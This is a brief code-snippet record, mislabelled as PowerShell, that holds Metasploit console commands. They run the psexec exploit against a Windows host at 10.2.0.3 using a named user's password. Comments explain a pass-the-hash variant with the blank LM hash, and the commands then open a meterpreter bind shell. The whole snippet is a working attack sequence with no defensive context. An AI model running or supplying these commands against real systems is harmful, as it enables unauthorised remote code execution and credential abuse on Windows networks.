---
id: 42c4cb45-827a-4528-8688-18fce18df9b8
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:05.079423+00:00'
updated_at: '2023-04-10T20:25:57.047502+00:00'
---

# Code Snippet 42c4cb45

**Language**: Powershell

```powershell
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser jarrieta
set SMBPass nastyCutt3r  
# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
# NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```


